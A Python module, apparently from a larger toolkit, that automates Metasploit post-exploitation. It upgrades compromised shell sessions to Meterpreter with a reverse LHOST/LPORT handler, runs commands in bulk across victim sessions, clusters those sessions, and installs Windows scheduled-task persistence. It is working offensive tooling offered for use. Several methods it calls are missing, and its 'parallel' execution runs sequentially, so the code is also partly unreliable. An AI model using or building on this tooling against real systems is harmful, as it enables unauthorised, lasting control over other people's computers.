"""
MSF Advanced Session Manager v5.0
Provides session upgrading, bulk operations, clustering, and persistence
"""

import asyncio
import json
import logging
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum

from msf_stable_integration import MSFConsoleStableWrapper, OperationResult
from msf_extended_tools import ExtendedOperationResult

logger = logging.getLogger(__name__)


class SessionType(Enum):
    """Session types in MSF"""
    SHELL = "shell"
    METERPRETER = "meterpreter"
    POWERSHELL = "powershell"
    PYTHON = "python"
    SSH = "ssh"
    UNKNOWN = "unknown"


@dataclass
class SessionInfo:
    """Enhanced session information"""
    id: str
    type: SessionType
    target_host: str
    info: str
    tunnel_local: str = ""
    tunnel_peer: str = ""
    via_exploit: str = ""
    via_payload: str = ""
    created_at: datetime = field(default_factory=datetime.now)
    last_checkin: datetime = field(default_factory=datetime.now)
    tags: Set[str] = field(default_factory=set)
    group: Optional[str] = None
    health_status: str = "healthy"
    metadata: Dict[str, Any] = field(default_factory=dict)


class MSFAdvancedSessionManager(MSFConsoleStableWrapper):
    """Advanced session management with upgrading, bulk operations, and persistence"""
    
    def __init__(self):
        super().__init__()
        self._sessions: Dict[str, SessionInfo] = {}
        self._session_groups: Dict[str, Set[str]] = {}
        self._persistence_handlers = {}
        self._upgrade_queue = asyncio.Queue()
        self._monitoring = False
        self._monitor_task = None
        
    async def initialize_session_manager(self) -> OperationResult:
        """Initialize advanced session management"""
        try:
            # Start session monitoring
            self._monitoring = True
            self._monitor_task = asyncio.create_task(self._monitor_sessions())
            
            # Load persisted session data
            await self._load_session_data()
            
            return OperationResult(
                success=True,
                data={"status": "initialized"},
                metadata={"session_manager": "v5.0"}
            )
            
        except Exception as e:
            logger.error(f"Failed to initialize session manager: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
    
    # ==================== SESSION UPGRADING ====================
    
    async def msf_session_upgrader(
        self,
        session_id: str,
        target_type: str = "meterpreter",
        handler_options: Optional[Dict[str, Any]] = None,
        timeout: int = 300,
        **kwargs
    ) -> ExtendedOperationResult:
        """Upgrade shell sessions to meterpreter or other types"""
        try:
            # Validate session exists and type
            session_info = await self._get_session_info(session_id)
            if not session_info:
                return ExtendedOperationResult(
                    success=False,
                    data=None,
                    error=f"Session {session_id} not found"
                )
                
            if session_info["type"] == target_type:
                return ExtendedOperationResult(
                    success=True,
                    data={
                        "session_id": session_id,
                        "message": f"Session already type {target_type}"
                    },
                    metadata={"action": "session_upgrade"}
                )
                
            # Use appropriate upgrade method based on current and target type
            if session_info["type"] == "shell" and target_type == "meterpreter":
                result = await self._upgrade_shell_to_meterpreter(session_id, handler_options, timeout)
            elif session_info["type"] == "shell" and target_type == "powershell":
                result = await self._upgrade_shell_to_powershell(session_id, timeout)
            else:
                return ExtendedOperationResult(
                    success=False,
                    data=None,
                    error=f"Upgrade from {session_info['type']} to {target_type} not supported"
                )
                
            return result
            
        except Exception as e:
            logger.error(f"Session upgrade error: {e}")
            return ExtendedOperationResult(
                success=False,
                data=None,
                error=str(e)
            )
    
    async def _upgrade_shell_to_meterpreter(
        self,
        session_id: str,
        handler_options: Optional[Dict[str, Any]],
        timeout: int
    ) -> ExtendedOperationResult:
        """Upgrade shell to meterpreter session"""
        try:
            # Method 1: Use sessions -u command
            upgrade_cmd = f"sessions -u {session_id}"
            result = await self.execute_command(upgrade_cmd, timeout=timeout)
            
            if "Meterpreter session" in result.output:
                # Extract new session ID
                import re
                match = re.search(r'Meterpreter session (\d+) opened', result.output)
                if match:
                    new_session_id = match.group(1)
                    
                    return ExtendedOperationResult(
                        success=True,
                        data={
                            "original_session": session_id,
                            "upgraded_session": new_session_id,
                            "type": "meterpreter",
                            "method": "sessions_upgrade"
                        },
                        output=result.output,
                        metadata={"action": "session_upgrade", "duration": timeout}
                    )
                    
            # Method 2: Use post/multi/manage/shell_to_meterpreter
            if handler_options:
                lhost = handler_options.get("LHOST", "0.0.0.0")
                lport = handler_options.get("LPORT", "4444")
            else:
                # Get default LHOST
                lhost = await self._get_default_lhost()
                lport = "4444"
                
            upgrade_module = "post/multi/manage/shell_to_meterpreter"
            
            # Configure and run upgrade module
            commands = [
                f"use {upgrade_module}",
                f"set SESSION {session_id}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
                "run"
            ]
            
            for cmd in commands:
                result = await self.execute_command(cmd)
                
            # Wait for upgrade to complete
            await asyncio.sleep(5)
            
            # Check for new meterpreter session
            sessions_result = await self.execute_command("sessions -l")
            new_session = self._find_upgraded_session(sessions_result.output, session_id)
            
            if new_session:
                return ExtendedOperationResult(
                    success=True,
                    data={
                        "original_session": session_id,
                        "upgraded_session": new_session,
                        "type": "meterpreter",
                        "method": "shell_to_meterpreter_module"
                    },
                    metadata={"action": "session_upgrade", "handler": {"LHOST": lhost, "LPORT": lport}}
                )
            else:
                return ExtendedOperationResult(
                    success=False,
                    data=None,
                    error="Upgrade failed - no new meterpreter session detected",
                    output=result.output
                )
                
        except Exception as e:
            logger.error(f"Shell to meterpreter upgrade error: {e}")
            return ExtendedOperationResult(
                success=False,
                data=None,
                error=str(e)
            )
    
    # ==================== BULK SESSION OPERATIONS ====================
    
    async def msf_bulk_session_operations(
        self,
        action: str,
        session_ids: Optional[List[str]] = None,
        group: Optional[str] = None,
        command: Optional[str] = None,
        script: Optional[str] = None,
        timeout: int = 60,
        parallel: bool = True,
        **kwargs
    ) -> ExtendedOperationResult:
        """Execute operations on multiple sessions simultaneously"""
        try:
            # Determine target sessions
            target_sessions = []
            
            if session_ids:
                target_sessions = session_ids
            elif group and group in self._session_groups:
                target_sessions = list(self._session_groups[group])
            else:
                # Get all active sessions
                sessions_result = await self.execute_command("sessions -l")
                all_sessions = self._parse_session_list(sessions_result.output)
                target_sessions = list(all_sessions.keys())
                
            if not target_sessions:
                return ExtendedOperationResult(
                    success=False,
                    data=None,
                    error="No target sessions found"
                )
                
            # Execute action
            if action == "execute":
                results = await self._bulk_execute_command(target_sessions, command, parallel, timeout)
            elif action == "script":
                results = await self._bulk_run_script(target_sessions, script, parallel, timeout)
            elif action == "info":
                results = await self._bulk_get_info(target_sessions, parallel)
            elif action == "kill":
                results = await self._bulk_kill_sessions(target_sessions, parallel)
            elif action == "migrate":
                results = await self._bulk_migrate_sessions(target_sessions, parallel, timeout)
            else:
                return ExtendedOperationResult(
                    success=False,
                    data=None,
                    error=f"Unknown bulk action: {action}"
                )
                
            # Aggregate results
            successful = sum(1 for r in results.values() if r.get("success", False))
            failed = len(results) - successful
            
            return ExtendedOperationResult(
                success=failed == 0,
                data={
                    "action": action,
                    "total_sessions": len(target_sessions),
                    "successful": successful,
                    "failed": failed,
                    "results": results
                },
                metadata={
                    "bulk_operation": True,
                    "parallel": parallel,
                    "timeout": timeout
                },
                extended_data={
                    "target_sessions": target_sessions,
                    "execution_time": datetime.now().isoformat()
                }
            )
            
        except Exception as e:
            logger.error(f"Bulk session operation error: {e}")
            return ExtendedOperationResult(
                success=False,
                data=None,
                error=str(e)
            )
    
    async def _bulk_execute_command(
        self,
        sessions: List[str],
        command: str,
        parallel: bool,
        timeout: int
    ) -> Dict[str, Dict[str, Any]]:
        """Execute command on multiple sessions"""
        results = {}
        
        if parallel:
            # Parallel execution
            tasks = []
            for session_id in sessions:
                task = self._execute_on_session(session_id, command, timeout)
                tasks.append((session_id, task))
                
            for session_id, task in tasks:
                try:
                    result = await task
                    results[session_id] = {
                        "success": result.success,
                        "output": result.output,
                        "error": result.error
                    }
                except Exception as e:
                    results[session_id] = {
                        "success": False,
                        "error": str(e)
                    }
        else:
            # Sequential execution
            for session_id in sessions:
                try:
                    result = await self._execute_on_session(session_id, command, timeout)
                    results[session_id] = {
                        "success": result.success,
                        "output": result.output,
                        "error": result.error
                    }
                except Exception as e:
                    results[session_id] = {
                        "success": False,
                        "error": str(e)
                    }
                    
        return results
    
    # ==================== SESSION CLUSTERING ====================
    
    async def msf_session_clustering(
        self,
        action: str,
        group_name: Optional[str] = None,
        session_ids: Optional[List[str]] = None,
        criteria: Optional[Dict[str, Any]] = None,
        **kwargs
    ) -> ExtendedOperationResult:
        """Group and manage sessions in clusters"""
        try:
            if action == "create":
                # Create session group
                if not group_name:
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error="Group name required"
                    )
                    
                if session_ids:
                    # Manual grouping
                    self._session_groups[group_name] = set(session_ids)
                elif criteria:
                    # Auto-grouping based on criteria
                    matching_sessions = await self._find_sessions_by_criteria(criteria)
                    self._session_groups[group_name] = set(matching_sessions)
                else:
                    self._session_groups[group_name] = set()
                    
                return ExtendedOperationResult(
                    success=True,
                    data={
                        "group": group_name,
                        "sessions": list(self._session_groups[group_name]),
                        "count": len(self._session_groups[group_name])
                    },
                    metadata={"action": "create_group"}
                )
                
            elif action == "add":
                # Add sessions to group
                if not group_name or not session_ids:
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error="Group name and session_ids required"
                    )
                    
                if group_name not in self._session_groups:
                    self._session_groups[group_name] = set()
                    
                self._session_groups[group_name].update(session_ids)
                
                return ExtendedOperationResult(
                    success=True,
                    data={
                        "group": group_name,
                        "added": session_ids,
                        "total_sessions": len(self._session_groups[group_name])
                    },
                    metadata={"action": "add_to_group"}
                )
                
            elif action == "remove":
                # Remove sessions from group
                if not group_name or not session_ids:
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error="Group name and session_ids required"
                    )
                    
                if group_name in self._session_groups:
                    for sid in session_ids:
                        self._session_groups[group_name].discard(sid)
                        
                return ExtendedOperationResult(
                    success=True,
                    data={
                        "group": group_name,
                        "removed": session_ids,
                        "remaining_sessions": len(self._session_groups.get(group_name, set()))
                    },
                    metadata={"action": "remove_from_group"}
                )
                
            elif action == "list":
                # List groups
                groups_info = []
                for group_name, sessions in self._session_groups.items():
                    groups_info.append({
                        "name": group_name,
                        "sessions": list(sessions),
                        "count": len(sessions)
                    })
                    
                return ExtendedOperationResult(
                    success=True,
                    data={"groups": groups_info},
                    metadata={"action": "list_groups", "total_groups": len(groups_info)}
                )
                
            elif action == "delete":
                # Delete group
                if not group_name:
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error="Group name required"
                    )
                    
                deleted = self._session_groups.pop(group_name, None)
                
                return ExtendedOperationResult(
                    success=deleted is not None,
                    data={
                        "group": group_name,
                        "deleted": deleted is not None
                    },
                    metadata={"action": "delete_group"}
                )
                
            else:
                return ExtendedOperationResult(
                    success=False,
                    data=None,
                    error=f"Unknown clustering action: {action}"
                )
                
        except Exception as e:
            logger.error(f"Session clustering error: {e}")
            return ExtendedOperationResult(
                success=False,
                data=None,
                error=str(e)
            )
    
    # ==================== SESSION PERSISTENCE ====================
    
    async def msf_session_persistence(
        self,
        action: str,
        session_id: Optional[str] = None,
        method: str = "scheduled_task",
        options: Optional[Dict[str, Any]] = None,
        **kwargs
    ) -> ExtendedOperationResult:
        """Implement session persistence mechanisms"""
        try:
            if action == "enable":
                # Enable persistence for session
                if not session_id:
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error="Session ID required"
                    )
                    
                # Check session type
                session_info = await self._get_session_info(session_id)
                if not session_info or session_info["type"] != "meterpreter":
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error="Persistence requires meterpreter session"
                    )
                    
                # Apply persistence based on method
                if method == "scheduled_task":
                    result = await self._apply_scheduled_task_persistence(session_id, options)
                elif method == "registry":
                    result = await self._apply_registry_persistence(session_id, options)
                elif method == "service":
                    result = await self._apply_service_persistence(session_id, options)
                else:
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error=f"Unknown persistence method: {method}"
                    )
                    
                if result["success"]:
                    self._persistence_handlers[session_id] = {
                        "method": method,
                        "options": options,
                        "enabled_at": datetime.now().isoformat()
                    }
                    
                return ExtendedOperationResult(
                    success=result["success"],
                    data=result,
                    metadata={"action": "enable_persistence", "method": method}
                )
                
            elif action == "disable":
                # Disable persistence
                if not session_id:
                    return ExtendedOperationResult(
                        success=False,
                        data=None,
                        error="Session ID required"
                    )
                    
                if session_id not in self._persistence_handlers:
                    return ExtendedOperationResult(
                        success=True,
                        data={"message": "No persistence enabled for session"},
                        metadata={"action": "disable_persistence"}
                    )
                    
                handler = self._persistence_handlers[session_id]
                result = await self._remove_persistence(session_id, handler["method"], handler["options"])
                
                if result["success"]:
                    del self._persistence_handlers[session_id]
                    
                return ExtendedOperationResult(
                    success=result["success"],
                    data=result,
                    metadata={"action": "disable_persistence"}
                )
                
            elif action == "list":
                # List persistence handlers
                handlers_info = []
                for sid, handler in self._persistence_handlers.items():
                    handlers_info.append({
                        "session_id": sid,
                        "method": handler["method"],
                        "enabled_at": handler["enabled_at"]
                    })
                    
                return ExtendedOperationResult(
                    success=True,
                    data={"persistence_handlers": handlers_info},
                    metadata={"action": "list_persistence", "count": len(handlers_info)}
                )
                
            else:
                return ExtendedOperationResult(
                    success=False,
                    data=None,
                    error=f"Unknown persistence action: {action}"
                )
                
        except Exception as e:
            logger.error(f"Session persistence error: {e}")
            return ExtendedOperationResult(
                success=False,
                data=None,
                error=str(e)
            )
    
    async def _apply_scheduled_task_persistence(
        self,
        session_id: str,
        options: Optional[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """Apply scheduled task persistence"""
        try:
            # Use persistence module
            persistence_module = "exploit/windows/local/persistence"
            
            commands = [
                f"use {persistence_module}",
                f"set SESSION {session_id}",
                f"set TECHNIQUE SCHTASKS",
                "run"
            ]
            
            if options:
                if "STARTUP_NAME" in options:
                    commands.insert(-1, f"set STARTUP_NAME {options['STARTUP_NAME']}")
                if "DELAY" in options:
                    commands.insert(-1, f"set DELAY {options['DELAY']}")
                    
            for cmd in commands:
                result = await self.execute_command(cmd)
                
            return {
                "success": "Persistence added" in result.output,
                "method": "scheduled_task",
                "output": result.output
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    # ==================== HELPER METHODS ====================
    
    async def _monitor_sessions(self) -> None:
        """Monitor sessions for health and events"""
        while self._monitoring:
            try:
                # Get current sessions
                result = await self.execute_command("sessions -l")
                current_sessions = self._parse_session_list(result.output)
                
                # Update session info
                for session_id, info in current_sessions.items():
                    if session_id not in self._sessions:
                        # New session
                        self._sessions[session_id] = SessionInfo(
                            id=session_id,
                            type=SessionType(info.get("type", "unknown")),
                            target_host=info.get("target_host", ""),
                            info=info.get("info", "")
                        )
                    else:
                        # Update existing session
                        self._sessions[session_id].last_checkin = datetime.now()
                        
                # Check for dead sessions
                for session_id in list(self._sessions.keys()):
                    if session_id not in current_sessions:
                        # Session closed
                        del self._sessions[session_id]
                        # Remove from groups
                        for group in self._session_groups.values():
                            group.discard(session_id)
                            
            except Exception as e:
                logger.error(f"Session monitoring error: {e}")
                
            await asyncio.sleep(10)  # Check every 10 seconds
    
    async def _get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get detailed session information"""
        result = await self.execute_command(f"sessions -i {session_id} -c 'sysinfo'")
        
        if "Unknown session ID" in result.output:
            return None
            
        # Parse session info
        info = {"id": session_id}
        
        # Extract session type
        if "meterpreter" in result.output.lower():
            info["type"] = "meterpreter"
        elif "shell" in result.output.lower():
            info["type"] = "shell"
        else:
            info["type"] = "unknown"
            
        return info
    
    def _parse_session_list(self, output: str) -> Dict[str, Dict[str, Any]]:
        """Parse session list from MSF output"""
        sessions = {}
        lines = output.strip().split('\n')
        
        for line in lines:
            if 'Active sessions' in line or '===' in line or not line.strip():
                continue
                
            parts = line.split()
            if len(parts) >= 4 and parts[0].isdigit():
                session_id = parts[0]
                sessions[session_id] = {
                    "type": parts[1],
                    "info": ' '.join(parts[2:]),
                    "target_host": parts[3] if len(parts) > 3 else ""
                }
                
        return sessions
    
    async def _execute_on_session(self, session_id: str, command: str, timeout: int) -> OperationResult:
        """Execute command on specific session"""
        cmd = f"sessions -c '{command}' -i {session_id}"
        return await self.execute_command(cmd, timeout=timeout)
    
    async def _get_default_lhost(self) -> str:
        """Get default LHOST for handlers"""
        result = await self.execute_command("get LHOST")
        
        if result.success and result.output:
            for line in result.output.split('\n'):
                if "LHOST" in line and "=>" in line:
                    return line.split("=>")[1].strip()
                    
        return "0.0.0.0"
    
    def _find_upgraded_session(self, sessions_output: str, original_id: str) -> Optional[str]:
        """Find upgraded session ID"""
        sessions = self._parse_session_list(sessions_output)
        
        # Look for new meterpreter session
        for sid, info in sessions.items():
            if sid != original_id and info["type"] == "meterpreter":
                return sid
                
        return None
    
    async def _find_sessions_by_criteria(self, criteria: Dict[str, Any]) -> List[str]:
        """Find sessions matching criteria"""
        matching = []
        sessions = self._parse_session_list((await self.execute_command("sessions -l")).output)
        
        for sid, info in sessions.items():
            match = True
            
            if "type" in criteria and info["type"] != criteria["type"]:
                match = False
            if "target_host" in criteria and criteria["target_host"] not in info.get("target_host", ""):
                match = False
                
            if match:
                matching.append(sid)
                
        return matching
    
    async def _load_session_data(self) -> None:
        """Load persisted session data"""
        # Implementation for loading persisted session data
        pass
    
    async def _save_session_data(self) -> None:
        """Save session data for persistence"""
        # Implementation for saving session data
        pass